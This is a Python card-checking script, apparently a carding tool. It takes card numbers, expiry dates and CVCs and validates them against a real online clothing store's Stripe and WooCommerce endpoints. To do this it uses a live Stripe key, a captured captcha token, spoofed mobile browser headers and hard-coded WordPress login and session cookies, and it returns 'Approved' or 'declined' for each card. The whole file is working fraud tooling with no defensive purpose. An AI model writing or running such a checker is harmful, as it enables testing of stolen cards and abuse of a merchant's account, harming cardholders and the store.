import os
import requests
import re
import random
import time
import string,json
import base64,user_agent,flagz
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import pycountry,jwt

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import BeautifulSoup
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests

def st(ccx):
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    data = f'type=card&billing_details[name]=+&billing_details[email]=mdfgero%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4911ca7c-daab-4ee0-86f6-61006df4913d5f2c1e&muid=c41a2862-e82c-49fe-bb57-f5a2670e1530905ae2&sid=5d0a68b3-e36e-4b39-a2d2-67ddf7deb8b6ccf602&pasted_fields=number&payment_user_agent=stripe.js%2F455defd472%3B+stripe-js-v3%2F455defd472%3B+split-card-element&referrer=https%3A%2F%2Fwww.fashionchingu.com&time_on_page=29276&key=pk_live_51HPOYUGcZoU9AJNR2UZ2nDPJrX0lslOjSGi7LlUYj2XRThIiEHciyaefRNrRyiyI7cAtwIufQOr5ddKw9awYWItR00eG80CVzA&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiRTB0RWhoMDRYbnlxSFc5V0FqMHQ2TzdvUWpsOTdZeXIwNHNhNlRja0hZajZ6TUhoeVV3dVByZ1NhY3pzaDduVmZybnFaZm5MZEEydkprSGhlL0lnaUwvejV6bHcwTjhaSzE1Vkxkcnhka0c0Wm5EWnhmRzFKSWpJaGNpVHF6NFo3NlBuWkdjQTZ2dnA3ZzhYRGVGRTFCSTFFQ1Fkb0xLSGpCWXhkNS9QZ1NtaGZoMTI3b2JpUGdMREs5MDdENXJaNENiQWJHa25EREg4V05NekhzSWhycDIyZHV2WHZ0dHVoWWllcUZKWmZTOGxmYnM4eW4vQ1NXSEFTb1N1ek1uSWtINk9ObGI5bFNHNEpjcUtkV2c0Rm9oMk9hMWM2Kzl5MklUa1Zma05IUjFmODF6aWdlRFVQTXE4Wlp1RmpFWjJoQTJJSzF2NlB5bUVLUXFhb2NyalRBT1hvMFBmdGs2Um1sTko3NFYybVhJVlhVN294U1Z4cmFwQ1FkY3ZFNmZmajMveGl2Y0dsK2xEN20wSG9QZk5FRDlrZHd2ZEVsMkl4cUJmeXlWM1dZdXNTWW51WW1UVGtXdGZRUVlsa2pvelVmbDdKVlFHRzRveHN0Y1VQNmVZTjRiazgvS3kwejZOcmNWamFhWWZXYVhVVnVMMUkwNmNmb2tsUU5uazVzN0QwRHV0SnFwY2Jldk5IaVhaWUNvNW4wZUpBQ2ptK1ZWdHJ2eFZ4RHIxaDlRZS9oUU91TVRVQnRZZFJWWm54dG52UFh1L1pFVGZ1N2tvVHlyQVhrRFcxZ2wyQXBRanlSaXIxN1dhbUZsNFZvNnZKLzcxL1RVN0JhTkRQcWhEL1pjNDVaaG1UY0JLWmlNUjN1VjZMVUZUL1ljSzh6ZjFsTXpobS92S2pyU0ZTOUgxMk1HcUdna1NsbVBYcm5Pa2k3c2YwQk0rSDQ2VW9GcC9zSnlBM0JqVUZaN3NMMzVTQ0U1T0RKa1NJR2NWUFlra1JmVWFuWVNLRnA5Zk8rTzNhQ3A2MU1sMENCdXE3MjdBRXpSdDdxU1k3QVRScDlyaFdjTGl5bmtVNG9Ea3A0MHFMUlZsenNyZEhJeGsvZlo3RW1ua1NqeWdmZkxodGxXVlF2NTJoZjVVM2kyZkk1bW10cXBBYU91QXpVUGFTOVE4VU5aZkRaK1NPZ1ZmU050bFRjNXZ2TVpEUmYweEV2K2hLVGcvWmJUMi9Ea0s1aHFPeVZDenJsdjE3NDNvd0VodXJvbmR6ZGxqTWlPZ3N6VDVVS3h2OTBmUkFsdUJWRThLbHRRRE1zMWJORHpXRnZZN3crNTBUdXI5dFJWcE5xV05HWktsVDc4em04RlF0L1gwL3V3cmwrclhhOFl3eDFQdkhyMUVSVjlaelE4V2pvSWJZelpKRXNmRVRiWWF1L21BaE9UUzN4blU5bTBHWVJTeVdSYlhBa3YyN1NNL0RjbFp2VDNLWEZMNFVaOUdxZ0IrdGpiS2NEVHQwLyt5MWZ2Y09GQzIyZ09iSENiWk51YXRWZUtFc3lJVVV1bXBsSm5JYnhiS1Q4aWFhMFlrQUNYaEFraVVjVzlWUm5wMFgwWGErOWJER2hRSmZGSlRqUVJ1T1pTVE0vVmR0alA0UUJ4MFhZU1hMMm44amVISEtzTlpiT2VoS0JIQy95RDFjRXFhbDMvVmRNWGRqZDFlcmRIbXRneC9EaUxNbUF1WWpuNkx4bTNOM2oweldIWFN0NXVkTUV2bEt5RXkwWXhMa3phd2J5bkFJMWQ5bGtBSXN6NU9qVXFoUkNLYUdjWnR4aEpFQkEyczlic3VmQlZuVEE1NHpSRHBjOTN4bGZaS1VlamR0b1Njd0xzRWhvWFhobmhRMkhDb0JsWUYzcFBiMG1sRVFFcjl0d1dFWEo1UEErbVdLK3E0MVI4U3N2YmxDVXBDL0kvbTZnUURkVVUvZUk5ZHlkbURCTmZUbUZyWU0rU2N6Y1dZMGp6bUFJb1RxMG1nUCs1enhZTUI4V1JyeTdwME0zd2kwb1JDYjQ3dkpWcmFCSlkweC9RSkRPZWRsUEgrZHRYWGw2UjUvNWNTRzJOQkRJQWZOd1F1Q0VldlV1S1ZqaGNyUVVtNHZjeXk3cE4wUDV4RTF6ZFFYeXpuQ05GaUVwZlRid0VKaFZTU2p6K3Vkc09iZEhYOElhNDEvQ05CMEZBTFlLc2hMZVRKRUVXWnBMc1dxTHBTaUtYNEpxa2huZHZGMVhtZUdEVWd3NHF0WEpqQlgrbnRoUkZrN0FUK2svalFTWk9qNjQ5UTQ0clp4bnFoYWJPcVVoUW1ZZlhrcTFzUk1NSlJsQk5LZVFhRkh1UUJPL1pnSHFuSTFyMmZFT044NEZpeFMxakhYRHJIYSsxNktTY0JKeCt4L09NRTkvODNaaHlndGhjM2RHTnRkM3prVXgzeDBuVVlzbUNWdHdTK2ZHdWlJWlU1QnVpeEpIY2xUZFJpNExDdWphQUlVeHRrK2VNTE9PTVV2anJ2a1o2U2NsbHpTd01pbXFpSlVvUTZIK3ppeUh4WG9lYy9GbzJHLzBKNEhhN3VYenFQSzQ4bTRrcE1FUnY1K1VlcEZrV3NpNHZYeVBBSEhlbEsyWEV3c0ZpR01tVHhDTzBWeTcvNGx4emRXUmJtNUhod3d6UlRtVk9sYnE5VlpONjZNUitYM1UrZHJZNno2VlkrNUJwN1UrNk03QjBCRGZvVGoxUHQzVmdrU25pU29qOWlLVmJwMUlKS2xnSDYrOEg0VEYxQW9UdmRCRS83ZVh3QmJ4YS9ldmFFWnpwbnQ3Y0ZQT3ZzWE5NMk80NkJXZz09IiwiZXhwIjoxNzI0MTYyMDE3LCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMzdiZTIzODgiLCJwZCI6MCwiY2RhdGEiOiJlaUV6UmxreXRCb3B3QlY3ZUV3ekNyejdudFFKRTlsb1c2aitPaGp5NFdzejB2TzhKbDZydm0vSmlib252UTBmREFrcUJrMldmVDdFZWlOQTFNbzJxM2Z5WDVmTzM1Yzk1dDZDbVdHaFQxY2Q3TnppeVJiYWFCcExPVTRkTFdhWTRnNjdkVzRFL0NPMTNUdTRQdnBxcFJabXVwbzJIbDdielNZWXpSem9QZ2Zzem1qMGYxSlRneXB5eUZCV0ljdEIrdmtQN1FIcXYwZmRpdmxiIn0.AM6pTVRF7s_CgFn_qeMpgbJBDVy7ShIR7y7GElBjW-A'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id=response.json()['id']
    cookies = {
    '_gid': 'GA1.2.58462828.1724161407',
    '_fbp': 'fb.1.1724161407780.735055206309466096',
    '_pin_unauth': 'dWlkPU5HUmxPVEptTTJFdFl6UmtOeTAwTmpBNExXSm1ZV010TXpNNFpXTXhOemhrTm1JMw',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'receiptful-token': 'f2c6a4b5-86d3-4674-b863-259787d694b4',
    '_derived_epik': 'dj0yJnU9N2szczJ5OFlNMm9UT2VjT204MEQybWZ3T3JQQi1LQ2Imbj1DeWQxM3dQbzR6MG12RFhqVEpvU2h3Jm09MTAmdD1BQUFBQUdiRW5nWSZybT0xMCZydD1BQUFBQUdiRW5nWSZzcD0x',
    '__stripe_mid': 'c41a2862-e82c-49fe-bb57-f5a2670e1530905ae2',
    '__stripe_sid': '5d0a68b3-e36e-4b39-a2d2-67ddf7deb8b6ccf602',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'receiptful-session': '0a5713a4-e1c3-4a28-ab11-b0c2695a5427',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'wordpress_logged_in_91a18015bc49184c8421dc9760de082a': 'mfgvgero%7C1725371365%7COpVzWNwiCLhpMKKQtWDQdtTSKH75Cf9pnLDLHSneOya%7C7b41a967edb8302df209cb63ee8f89ded5e9462e7eba547d7250b09528bc43f3',
    'wfwaf-authcookie-9c4837e9d6601129e38c747df8161394': '86437%7Cother%7Cread%7Cb3fcfab422144707396e2113171c1f98cf3f977a3928466f7c6ba3216940a0a0',
    '_gcl_au': '1.1.1123722586.1724161406.1210562168.1724161492.1724161878',
    'sbjs_session': 'pgs%3D30%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_ZX0M5YM2NF': 'GS1.1.1724161407.1.1.1724161893.0.0.0',
    '_ga': 'GA1.2.1388613758.1724161407',
}


    headers = {
    'authority': 'www.fashionchingu.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.58462828.1724161407; _fbp=fb.1.1724161407780.735055206309466096; _pin_unauth=dWlkPU5HUmxPVEptTTJFdFl6UmtOeTAwTmpBNExXSm1ZV010TXpNNFpXTXhOemhrTm1JMw; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; receiptful-token=f2c6a4b5-86d3-4674-b863-259787d694b4; _derived_epik=dj0yJnU9N2szczJ5OFlNMm9UT2VjT204MEQybWZ3T3JQQi1LQ2Imbj1DeWQxM3dQbzR6MG12RFhqVEpvU2h3Jm09MTAmdD1BQUFBQUdiRW5nWSZybT0xMCZydD1BQUFBQUdiRW5nWSZzcD0x; __stripe_mid=c41a2862-e82c-49fe-bb57-f5a2670e1530905ae2; __stripe_sid=5d0a68b3-e36e-4b39-a2d2-67ddf7deb8b6ccf602; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; receiptful-session=0a5713a4-e1c3-4a28-ab11-b0c2695a5427; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_91a18015bc49184c8421dc9760de082a=mfgvgero%7C1725371365%7COpVzWNwiCLhpMKKQtWDQdtTSKH75Cf9pnLDLHSneOya%7C7b41a967edb8302df209cb63ee8f89ded5e9462e7eba547d7250b09528bc43f3; wfwaf-authcookie-9c4837e9d6601129e38c747df8161394=86437%7Cother%7Cread%7Cb3fcfab422144707396e2113171c1f98cf3f977a3928466f7c6ba3216940a0a0; _gcl_au=1.1.1123722586.1724161406.1210562168.1724161492.1724161878; sbjs_session=pgs%3D30%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.fashionchingu.com%2Fmy-account%2Fadd-payment-method%2F; _ga_ZX0M5YM2NF=GS1.1.1724161407.1.1.1724161893.0.0.0; _ga=GA1.2.1388613758.1724161407',
    'origin': 'https://www.fashionchingu.com',
    'referer': 'https://www.fashionchingu.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
    }
    data = {
    'stripe_source_id': id,
    'nonce': '546f5944d9',
}

    r3 = requests.post('https://www.fashionchingu.com/', params=params, cookies=cookies, headers=headers, data=data)
    if '"success":true' in r3.text or "Payment success" in r3.text or "success" in r3.text or "Payment Completed." in r3.text or "Thank you for your support." in r3.text or "Success" in r3.text or "Thank you" in r3.text or "succedd" in r3.text:
    	return 'Approved'
    else:
    	return 'Your card was declined.'